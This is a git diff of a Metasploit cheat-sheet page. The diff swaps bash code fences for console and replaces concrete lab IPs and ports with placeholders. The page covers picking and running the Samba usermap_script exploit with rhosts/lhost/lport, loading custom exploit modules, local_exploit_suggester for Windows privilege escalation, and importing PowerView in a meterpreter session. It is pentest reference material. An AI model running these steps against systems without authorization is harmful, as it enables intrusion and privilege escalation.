@@ -4,7 +4,6 @@ date: 2024-6-28
 tags: ["metasploit", "exploit", "vuln", "CVE", "privesc", "meterpreter", "Windows", "msfconsole", "searchsploit"]
 ---
 
----
 {{< tab set1 tab1 active >}}msfconsole{{< /tab >}}
 {{< tab set1 tab2 >}}meterpreter{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
@@ -13,7 +12,7 @@ tags: ["metasploit", "exploit", "vuln", "CVE", "privesc", "meterpreter", "Window
 
 <div>
 
-```bash
+```console
 msfconsole -q
 ```
 
@@ -23,17 +22,17 @@ msfconsole -q
 
 <div>
 
-```bash
+```console
 # Return to previous page
 back
 ```
 
-```bash
+```console
 # Upgrade session
 sessions -u
 ```
 
-```bash
+```console
 # quit metasploit
 exit
 ```
@@ -44,40 +43,40 @@ exit
 
 <div>
 
-```bash
+```console
 # For example: samba
 search samba
 ```
 
-```bash
+```console
 # Choose by #num
 use 15
 ```
 
-```bash
+```console
 # Choose by full path
 use exploit/multi/samba/usermap_script
 ```
 
-```bash
+```console
 # Show exploit settings
 options
 ```
 
-```bash
+```console
 # Set option, e.g.
-set rhosts 10.10.11.10
+set rhosts <TARGET>
 ```
 
-```bash
-set lhost 10.10.14.10
+```console
+set lhost <LOCAL_IP>
 ```
 
-```bash
-set lport 1337
+```console
+set lport <LOCAL_PORT>
 ```
 
-```bash
+```console
 # Run exploit
 run 
 ```
@@ -90,25 +89,25 @@ run
 
 <div>
 
-```bash
+```console
 mkdir -p ~/.msf4/modules/exploits/linux
 ```
 
-```bash
+```console
 mkdir -p ~/.msf4/modules/exploits/windows
 ```
 
-```bash
+```console
 # For example a linux script
 cp 12345.rb ~/.msf4/modules/exploits/linux
 ```
 
-```bash
+```console
 # Inside msfconsole
 reload_all
 ```
 
-```bash
+```console
 # Search
 search 12345
 ```
@@ -119,24 +118,24 @@ search 12345
 
 <div>
 
-```bash
+```console
 # Inside msfconsole, check db status
 db_status
 ```
 
-```bash
+```console
 sudo service postgresql start
 ```
 
-```bash
+```console
 update-rc.d postgresql enable
 ```
 
-```bash
+```console
 sudo msfdb init
 ```
 
-```bash
+```console
 # Go bask to msfconsole and check again
 db_status
 ```
@@ -150,7 +149,7 @@ db_status
 
 <div>
 
-```bash
+```console
 # Return from meterpreter
 background
 ```
@@ -161,28 +160,28 @@ background
 
 <div>
 
-```bash
+```console
 # Quick look of potential privesc (Windows)
 # Need to return from meterpreter
 use post/multi/recon/local_exploit_suggester
 ```
 
-```bash
+```console
 # Select opened session
 set session 1
 ```
 
-```bash
+```console
 # Show exploit settings
 options
 ```
 
-```bash
+```console
 # Set option, e.g.
-set rhosts 10.10.11.10
+set rhosts <TARGET>
 ```
 
-```bash
+```console
 # Run exploit
 run 
 ```
@@ -193,17 +192,17 @@ run
 
 <div>
 
-```bash
+```console
 # Use powershell module
 use powershell
 ```
 
-```bash
+```console
 # Import module
 powershell_import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
 ```
 
-```bash
+```console
 # Spawn powershell session
 powershell_shell 
 ```
